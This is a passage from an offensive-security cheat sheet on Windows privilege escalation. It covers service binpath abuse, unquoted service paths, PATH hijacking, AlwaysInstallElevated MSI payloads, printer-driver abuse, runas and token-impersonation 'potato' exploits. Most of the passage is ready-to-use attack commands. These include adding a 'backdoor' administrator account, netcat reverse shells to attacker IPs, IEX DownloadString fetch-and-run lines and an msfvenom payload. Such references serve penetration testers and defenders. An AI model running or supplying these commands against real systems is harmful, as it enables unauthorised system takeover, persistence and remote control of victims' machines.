  \ SERVICE_ALL_ACCESS\n  RW BUILTIN\\Administrators\n        SERVICE_ALL_ACCESS\n  RW NT AUTHORITY\\Authenticated Users\n\
  \        SERVICE_ALL_ACCESS\n  RW BUILTIN\\Power Users\n        SERVICE_ALL_ACCESS\n\n$ sc config <vuln-service> binpath=\"\
  net user backdoor backdoor123 /add\"\n$ sc config <vuln-service> binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\\
  System32\\cmd.exe\"\n$ sc stop <vuln-service>\n$ sc start <vuln-service>\n$ sc config <vuln-service> binpath=\"net localgroup\
  \ Administrators backdoor /add\"\n$ sc stop <vuln-service>\n$ sc start <vuln-service>\n```\n\n## EoP - Windows Subsystem\
  \ for Linux (WSL)\n\n> With root privileges Windows  Subsystem for Linux (WSL)  allows users to create a bind shell on any\
  \ port (no elevation needed). Don't know the root password? No problem just set the default user to root W/ `<distro>.exe\
  \ --default-user root`. Now start your bind shell or reverse. - [Warlockobama's tweet](https://twitter.com/Warlockobama/status/1067890915753132032)\n\
  \n```powershell\nwsl whoami\n./ubuntun1604.exe config --default-user root\nwsl whoami\nwsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'\n\
  ```\n\nBinary `bash.exe` can also be found in `C:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe`\n\n\
  Alternatively you can explore the `WSL` filesystem in the folder `C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\\
  LocalState\\rootfs\\`\n\n## EoP - Unquoted Service Paths\n\nThe Microsoft Windows Unquoted Service Path Enumeration Vulnerability.\
  \ All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators,\
  \ then the service will attempt to access a resource in the parent path first.\n\n```powershell\n# in CMD\nwmic service\
  \ get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\" |findstr /i /v \"\"\"\n\
  wmic service get name,displayname,startmode,pathname | findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"\n# in PowerShell\n\
  gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName\
  \ -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name\n```\n\n* Metasploit exploit\
  \ : `exploit/windows/local/trusted_service_path`\n* PowerUp exploit\n\n    ```powershell\n    # find the vulnerable application\n\
  \    C:\\> powershell.exe -nop -exec bypass \"IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1');\
  \ Invoke-AllChecks\"\n\n    ...\n    [*] Checking for unquoted service paths...\n    ServiceName   : BBSvc\n    Path   \
  \       : C:\\Program Files\\Microsoft\\Bing Bar\\7.1\\BBSvc.exe\n    StartName     : LocalSystem\n    AbuseFunction : Write-ServiceBinary\
  \ -ServiceName 'BBSvc' -Path <HijackPath>\n    ...\n\n    # automatic exploit\n    Invoke-ServiceAbuse -Name [SERVICE_NAME]\
  \ -Command \"..\\..\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\"\n    ```\n\n### Example\n\nFor `C:\\Program Files\\\
  something\\legit.exe`, Windows will try the following paths first:\n\n* `C:\\Program.exe`\n* `C:\\Program Files.exe`\n\n\
  ## EoP - $PATH Interception\n\nRequirements:\n\n* PATH contains a writable folder with low privileges.\n* The writable folder\
  \ is _before_ the folder that contains the legitimate binary.\n\nEXAMPLE:\n\n```powershell\n# List contents of the PATH\
  \ environment variable\n# EXAMPLE OUTPUT: C:\\Program Files\\nodejs\\;C:\\WINDOWS\\system32\n$env:Path\n\n# See permissions\
  \ of the target folder\n# EXAMPLE OUTPUT: BUILTIN\\Users: GR,GW\nicacls.exe \"C:\\Program Files\\nodejs\\\"\n\n# Place our\
  \ evil-file in that folder.\ncopy evil-file.exe \"C:\\Program Files\\nodejs\\cmd.exe\"\n```\n\nBecause (in this example)\
  \ \"C:\\Program Files\\nodejs\\\" is _before_ \"C:\\WINDOWS\\system32\\\" on the PATH variable, the next time the user runs\
  \ \"cmd.exe\", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.\n\n\
  ## EoP - Named Pipes\n\n1. Find named pipes: `[System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\")`\n2. Check named pipes\
  \ DACL: `pipesec.exe <named_pipe>`\n3. Reverse engineering software\n4. Send data throught the named pipe : `program.exe\
  \ >\\\\.\\pipe\\StdOutPipe 2>\\\\.\\pipe\\StdErrPipe`\n\n## EoP - Kernel Exploitation\n\nList of exploits kernel : [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)\n\
  \n### Security Bulletin Table\n\n| Security Bulletin | KB         | Description                                        \
  \ | Operating System                        |\n|------------------|-----------|-----------------------------------------------------|-----------------------------------------|\n\
  | [MS17-017](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-017) | KB4013081 | GDI Palette Objects\
  \ Local Privilege Escalation | Windows 7/8 |\n| [CVE-2017-8464](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-8464)\
  \ | - | LNK Remote Code Execution Vulnerability | Windows 10/8.1/7/2016/2010/2008 |\n| [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213)\
  \ | - | Windows COM Elevation of Privilege Vulnerability | Windows 10/8.1/7/2016/2010/2008 |\n| [CVE-2018-0833](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-0833)\
  \ | - | SMBv3 Null Pointer Dereference Denial of Service | Windows 8.1/Server 2012 R2 |\n| [CVE-2018-8120](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2018-8120)\
  \ | - | Win32k Elevation of Privilege Vulnerability | Windows 7 SP1/2008 SP2, 2008 R2 SP1 |\n| [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010)\
  \ | KB4013389 | Windows Kernel Mode Drivers | Windows 7/2008/2003/XP |\n| [MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)\
  \ | KB3199135 | Windows Kernel Mode Drivers | 2016 |\n| [MS16-111](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-111)\
  \ | KB3186973 | Kernel API | Windows 10 10586 (32/64)/8.1 |\n| [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098)\
  \ | KB3178466 | Kernel Driver | Windows 8.1 |\n| [MS16-075](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075)\
  \ | KB3164038 | Hot Potato | 2003/2008/7/8/2012 |\n| [MS16-034](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034)\
  \ | KB3143145 | Kernel Driver | 2008/7/8/10/2012 |\n| [MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032)\
  \ | KB3143141 | Secondary Logon Handle | 2008/7/8/10/2012 |\n| [MS16-016](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016)\
  \ | KB3136041 | WebDAV | 2008/Vista/7 |\n| [MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014)\
  \ | KB3134228 | Remote Code Execution | 2008/Vista/7 |\n| [MS03-026](https://www.exploit-db.com/exploits/66) | KB823980\
  \ | Buffer Overrun In RPC Interface | NT/2000/XP/2003 |\n\nTo cross compile a program from Kali, use the following command.\n\
  \n```powershell\nKali> i586-mingw32msvc-gcc -o adduser.exe useradd.c\n```\n\n## EoP - Microsoft Windows Installer\n\n###\
  \ AlwaysInstallElevated\n\nUsing the `reg query` command, you can check the status of the `AlwaysInstallElevated` registry\
  \ key for both the user and the machine. If both queries return a value of `0x1`, then `AlwaysInstallElevated` is enabled\
  \ for both user and machine, indicating the system is vulnerable.\n\n* Shell command\n\n    ```powershell\n    reg query\
  \ HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    reg query HKLM\\SOFTWARE\\Policies\\\
  Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    ```\n\n* PowerShell command\n\n    ```powershell\n    Get-ItemProperty\
  \ HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n    Get-ItemProperty HKCU\\Software\\Policies\\Microsoft\\Windows\\\
  Installer\n    ```\n\nThen create an MSI package and install it.\n\n```powershell\nmsfvenom -p windows/adduser USER=backdoor\
  \ PASS=backdoor123 -f msi -o evil.msi\nmsfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi\n\
  msiexec /quiet /qn /i C:\\evil.msi\n```\n\nTechnique also available in :\n\n* Metasploit : `exploit/windows/local/always_install_elevated`\n\
  * PowerUp.ps1 : `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`\n\n### CustomActions\n\n> Custom Actions in MSI\
  \ allow developers to specify scripts or executables to be run at various points during an installation\n\n* [mgeeky/msidump](https://github.com/mgeeky/msidump)\
  \ - a tool that analyzes malicious MSI installation packages, extracts files, streams, binary data and incorporates YARA\
  \ scanner.\n* [activescott/lessmsi](https://github.com/activescott/lessmsi) - A tool to view and extract the contents of\
  \ an Windows Installer (.msi) file.\n* [mandiant/msi-search](https://github.com/mandiant/msi-search) - This tool simplifies\
  \ the task for red team operators and security teams to identify which MSI files correspond to which software and enables\
  \ them to download the relevant file.\n\nEnumerate products on the machine\n\n```ps1\nGet-WmiObject Win32_Product | Select\
  \ Name, LocalPackage\nwmic product get identifyingnumber,name,vendor,version,localpackage\n```\n\nExecute the repair process\
  \ with the `/fa` parameter to trigger the CustomActions.\nWe can use both IdentifyingNumber `{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}`\
  \ or path to the installer `c:\\windows\\installer\\XXXXXXX.msi`.\nThe repair will run with the NT SYSTEM account.\n\n```ps1\n\
  $installed = Get-WmiObject Win32_Product\n$string= $installed | select-string -pattern \"PRODUCTNAME\"\n$string[0] -match\
  \ '{\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}}'\nStart-Process -FilePath \"msiexec.exe\" -ArgumentList \"/fa $($matches[0])\"\n\
  ```\n\nCommon mistakes in MSI installers:\n\n* Missing quiet parameters: it will spawn `conhost.exe` as `NT SYSTEM`. Use\
  \ `[CTRL]+[A]` to select some text in it, it will pause the execution.\n    * conhost -> properties -> \"legacy console\
  \ mode\" Link -> Internet Explorer -> CTRL+O –> cmd.exe\n* GUI with direct actions: open a URL and start the browser then\
  \ use the same scenario.\n* Binaries/Scripts loaded from user writable paths: you might need to win the race condition.\n\
  * DLL hijacking/search order abusing\n* PowerShell `-NoProfile` missing: Add custom commands into your profile\n\n    ```ps1\n\
  \    new-item -Path $PROFILE -Type file -Force\n    echo \"Start-Process -FilePath cmd.exe -Wait;\" > $PROFILE\n    ```\n\
  \n## EoP - Insecure GUI apps\n\nApplication running as SYSTEM allowing an user to spawn a CMD, or browse directories.\n\n\
  Example: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\"\
  \n\n## EoP - Evaluating Vulnerable Drivers\n\nLook for vuln drivers loaded, we often don't spend enough time looking at\
  \ this:\n\n* [Living Off The Land Drivers](https://www.loldrivers.io/) is a curated list of Windows drivers used by adversaries\
  \ to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate\
  \ potential threats.\n* Native binary: DriverQuery.exe\n\n    ```powershell\n    PS C:\\Users\\Swissky> driverquery.exe\
  \ /fo table /si\n    Module Name  Display Name           Driver Type   Link Date\n    ============ ======================\
  \ ============= ======================\n    1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM\n  \
  \  3ware        3ware                  Kernel        5/18/2015 6:28:03 PM\n    ACPI         Microsoft ACPI Driver  Kernel\
  \        12/9/1975 6:17:08 AM\n    AcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM\n    acpiex  \
  \     Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM\n    acpipagr     ACPI Processor Aggrega Kernel        1/24/2081\
  \ 8:36:36 AM\n    AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM\n    acpitime     ACPI Wake Alarm\
  \ Driver Kernel        2/9/1974 7:10:30 AM\n    ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM\n\
  \    <SNIP>\n    ```\n\n* [matterpreter/OffensiveCSharp/DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)\n\
  \n    ```powershell\n    PS C:\\Users\\Swissky> DriverQuery.exe --no-msft\n    [+] Enumerating driver services...\n    [+]\
  \ Checking file signatures...\n    Citrix USB Filter Driver\n        Service Name: ctxusbm\n        Path: C:\\Windows\\\
  system32\\DRIVERS\\ctxusbm.sys\n        Version: 14.11.0.138\n        Creation Time (UTC): 17/05/2018 01:20:50\n       \
  \ Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US\n   \
  \     Signer: CN=\"Citrix Systems, Inc.\", OU=XenApp(ClientSHA256), O=\"Citrix Systems, Inc.\", L=Fort Lauderdale, S=Florida,\
  \ C=US\n    <SNIP>\n    ```\n\n## EoP - Printers\n\n### Universal Printer\n\nCreate a Printer\n\n```ps1\n$printerName  \
  \   = 'Universal Priv Printer'\n$system32        = $env:systemroot + '\\system32'\n$drivers         = $system32 + '\\spool\\\
  drivers'\n$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\\
  ' + $printerName\n \nCopy-Item -Force -Path ($system32 + '\\mscms.dll')             -Destination ($system32 + '\\mimispool.dll')\n\
  Copy-Item -Force -Path '.\\mimikatz_trunk\\x64\\mimispool.dll'   -Destination ($drivers  + '\\x64\\3\\mimispool.dll')\n\
  Copy-Item -Force -Path '.\\mimikatz_trunk\\win32\\mimispool.dll' -Destination ($drivers  + '\\W32X86\\3\\mimispool.dll')\n\
  \ \nAdd-PrinterDriver -Name       'Generic / Text Only'\nAdd-Printer       -DriverName 'Generic / Text Only' -Name $printerName\
  \ -PortName 'FILE:' -Shared\n \nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles')        | Out-Null\nNew-Item  \
  \       -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\\
  Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\\3'           | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter\
  \ + '\\CopyFiles\\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty\
  \ -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'    \
  \   | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter\
  \ + '\\CopyFiles\\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\\3'        | Out-Null\nNew-ItemProperty\
  \ -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll')\
  \ | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Module'    -PropertyType 'String'\
  \      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  | Out-Null\n\
  New-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null\
  \             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Files'     -PropertyType\
  \ 'MultiString' -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name\
  \ 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null\n```\n\nExecute the driver\n\n```ps1\n$serverName\
  \  = 'dc.purple.lab'\n$printerName = 'Universal Priv Printer'\n$fullprinterName = '\\\\' + $serverName + '\\' + $printerName\
  \ + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nRemove-Printer -Name $fullprinterName\
  \ -ErrorAction SilentlyContinue\nAdd-Printer -ConnectionName $fullprinterName\n```\n\n### PrinterNightmare\n\n```ps1\ngit\
  \ clone https://github.com/Flangvik/DeployPrinterNightmare\nPS C:\\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll\
  \ EasySystemShell\n[<3] @Flangvik - TrustedSec\n[+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\\
  6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n\
  [+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n\
  [+] Adding printer driver => Generic / Text Only!\n[+] Adding printer => EasySystemShell!\n[+] Setting 64-bit Registry key\n\
  [+] Setting 32-bit Registry key\n[+] Setting '*' Registry key\n```\n\n```ps1\nPS C:\\target> $serverName  = 'printer-installed-host'\n\
  PS C:\\target> $printerName = 'EasySystemShell'\nPS C:\\target> $fullprinterName = '\\\\' + $serverName + '\\' + $printerName\
  \ + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nPS C:\\target> Remove-Printer -Name\
  \ $fullprinterName -ErrorAction SilentlyContinue\nPS C:\\target> Add-Printer -ConnectionName $fullprinterName\n```\n\n###\
  \ Bring Your Own Vulnerability\n\n[jacob-baines/concealed_position](https://github.com/jacob-baines/concealed_position)\n\
  \n* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE\n\
  * RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE\n* POISONDAMAGE\
  \ - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE\n* SLASHINGDAMAGE -\
  \ [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE\n\n```powershell\ncp_server.exe\
  \ -e ACIDDAMAGE\n# Get-Printer\n# Set the \"Advanced Sharing Settings\" -> \"Turn off password protected sharing\"\ncp_client.exe\
  \ -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE\ncp_client.exe -l -e ACIDDAMAGE\n```\n\n## EoP - Runas\n\nUse the `cmdkey` to\
  \ list the stored credentials on the machine.\n\n```powershell\ncmdkey /list\nCurrently stored credentials:\n Target: Domain:interactive=WORKGROUP\\\
  Administrator\n Type: Domain Password\n User: WORKGROUP\\Administrator\n```\n\nThen you can use `runas` with the `/savecred`\
  \ options in order to use the saved credentials.\nThe following example is calling a remote binary via an SMB share.\n\n\
  ```powershell\nrunas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\"\nrunas /savecred /user:Administrator\
  \ \"cmd.exe /k whoami\"\n```\n\nUsing `runas` with a provided set of credential.\n\n```powershell\nC:\\Windows\\System32\\\
  runas.exe /env /noprofile /user:<username> <password> \"c:\\users\\Public\\nc.exe -nc <attacker-ip> 4444 -e cmd.exe\"\n\
  ```\n\n```powershell\n$secpasswd = ConvertTo-SecureString \"<password>\" -AsPlainText -Force\n$mycreds = New-Object System.Management.Automation.PSCredential\
  \ (\"<user>\", $secpasswd)\n$computer = \"<hostname>\"\n[System.Diagnostics.Process]::Start(\"C:\\users\\public\\nc.exe\"\
  ,\"<attacker_ip> 4444 -e cmd.exe\", $mycreds.Username, $mycreds.Password, $computer)\n```\n\n## EoP - Abusing Shadow Copies\n\
  \nIf you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.\n\
  \n```powershell\n# List shadow copies using vssadmin (Needs Admnistrator Access)\nvssadmin list shadows\n  \n# List shadow\
  \ copies using diskshadow\ndiskshadow list shadows all\n  \n# Make a symlink to the shadow copy and access it\nmklink /d\
  \ c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n```\n\n## EoP - From local administrator to NT\
  \ SYSTEM\n\n```powershell\nPsExec.exe -i -s cmd.exe\n```\n\n## EoP - Living Off The Land Binaries and Scripts\n\nLiving\
  \ Off The Land Binaries and Scripts (and also Libraries) : [lolbas-project.github.io](https://lolbas-project.github.io)\n\
  \n> The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The\
  \ Land techniques.\n\nA LOLBin/Lib/Script must:\n\n* Be a Microsoft-signed file, either native to the OS or downloaded from\
  \ Microsoft.\nHave extra \"unexpected\" functionality. It is not interesting to document intended use cases.\nExceptions\
  \ are application whitelisting bypasses\n* Have functionality that would be useful to an APT or red team\n\n```powershell\n\
  wmic.exe process call create calc\nregsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll\nMicrosoft.Workflow.Compiler.exe\
  \ tests.xml results.xml\n```\n\n## EoP - Impersonation Privileges\n\nFull privileges cheatsheet at [gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin),\
  \ summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.\n\
  \n| Privilege | Impact | Tool | Execution path | Remarks |\n| --- | --- | --- | --- | --- |\n|`SeAssignPrimaryToken`| _**Admin**_\
  \ | 3rd party tool | _\"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe,\
  \ rottenpotato.exe and juicypotato.exe\"_ | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will\
  \ try to re-phrase it to something more recipe-like soon. |\n|`SeBackup`| **Threat** | _**Built-in commands**_ | Read sensitve\
  \ files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\\MEMORY.DMP<br> <br>- `SeBackupPrivilege`\
  \ (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to\
  \ work with /b parameter. |\n|`SeCreateToken`| _**Admin**_ | 3rd party tool | Create arbitrary token including local admin\
  \ rights with `NtCreateToken`. ||\n|`SeDebug`| _**Admin**_ | **PowerShell** | Duplicate the `lsass.exe` token.  | Script\
  \ to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |\n|`SeLoadDriver`|\
  \ _**Admin**_ | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys` or `capcom.sys`<br>2. Exploit the driver\
  \ vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin\
  \ command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2.\
  \ The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)\
  \  |\n|`SeRestore`| _**Admin**_ | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2.\
  \ Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3.\
  \ Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may\
  \ be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in \"Program Files\"\
  \ using the same privilege. |\n|`SeTakeOwnership`| _**Admin**_ | _**Built-in commands**_ |1. `takeown.exe /f \"%windir%\\\
  system32\"`<br>2. `icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F`<br>3. Rename cmd.exe to utilman.exe<br>4.\
  \ Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing\
  \ service binaries stored in \"Program Files\" using the same privilege. |\n|`SeTcb`| _**Admin**_ | 3rd party tool | Manipulate\
  \ tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||\n|`SeRelabel`| _**Admin**_\
  \ | 3rd party too | [decoder-it/RelabelAbuse](https://github.com/decoder-it/RelabelAbuse) | Allows you to own resources\
  \ that have an integrity level even higher than your own |\n\n### Restore A Service Account's Privileges\n\n> This tool\
  \ should be executed as LOCAL SERVICE or NETWORK SERVICE only.\n\n```powershell\n# https://github.com/itm4n/FullPowers\n\
  \nc:\\TOOLS>FullPowers\n[+] Started dummy thread with id 9976\n[+] Successfully created scheduled task.\n[+] Got new token!\
  \ Privilege count: 7\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.19041.84]\n(c) 2019 Microsoft Corporation.\
  \ All rights reserved.\n\nC:\\WINDOWS\\system32>whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege\
  \ Name                Description                               State\n============================= =========================================\
  \ =======\nSeAssignPrimaryTokenPrivilege Replace a process level token             Enabled\nSeIncreaseQuotaPrivilege   \
  \   Adjust memory quotas for a process        Enabled\nSeAuditPrivilege              Generate security audits          \
  \        Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege\
  \        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects        \
  \             Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Enabled\n\nc:\\TOOLS>FullPowers\
  \ -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z\n```\n\n### Meterpreter getsystem and alternatives\n\n```powershell\n\
  meterpreter> getsystem \nTokenvator.exe getsystem cmd.exe \nincognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe \n\
  psexec -s -i cmd.exe \npython getsystem.py # from https://github.com/sailay1996/tokenx_privEsc\n```\n\n### RottenPotato\
  \ (Token Impersonation)\n\n* Binary available at : [foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)\
  \ and [breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)\n* Exploit using Metasploit with `incognito\
  \ mode` loaded.\n\n    ```c\n    getuid\n    getprivs\n    use incognito\n    list\\_tokens -u\n    cd c:\\temp\\\n    execute\
  \ -Hc -f ./rot.exe\n    impersonate\\_token \"NT AUTHORITY\\SYSTEM\"\n    ```\n\n```powershell\nInvoke-TokenManipulation\
  \ -ImpersonateUser -Username \"lab\\domainadminuser\"\nInvoke-TokenManipulation -ImpersonateUser -Username \"NT AUTHORITY\\\
  SYSTEM\"\nGet-Process wininit | Invoke-TokenManipulation -CreateProcess \"Powershell.exe -nop -exec bypass -c \\\"IEX (New-Object\
  \ Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\\\"};\"\n```\n\n### Juicy Potato (Abusing\
  \ the golden privileges)\n\n> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**\n> If\
  \ the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**\n\n* Binary available at : [ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/releases)\n\
  \n1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken**\
  \ (Impersonate a client after authentication)\n\n    ```powershell\n    whoami /priv\n    ```\n\n2. Select a CLSID based\
  \ on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object\n\n    * [Windows\
  \ 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)\n    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)\n\
  \    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)\n    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)\n\
  \    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)\n    *\
  \ [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)\n    * [Windows Server\
  \ 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)\n\n3. Execute JuicyPotato to run a privileged\
  \ command.\n\n    ```powershell\n    JuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \"IP PORT -e cmd.exe\"\
  \ -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\n    JuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}\n\
  \    JuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \"/c c:\\\
  users\\User\\reverse_shell.exe\"\n        Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337\n        ......\n        [+]\
  \ authresult 0\n        {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM\n        [+] CreateProcessWithTokenW\
  \ OK\n    ```\n\n### Rogue Potato (Fake OXID Resolver)\n\n* Binary available at [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)\n\
  \n```powershell\n# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port\nsocat\
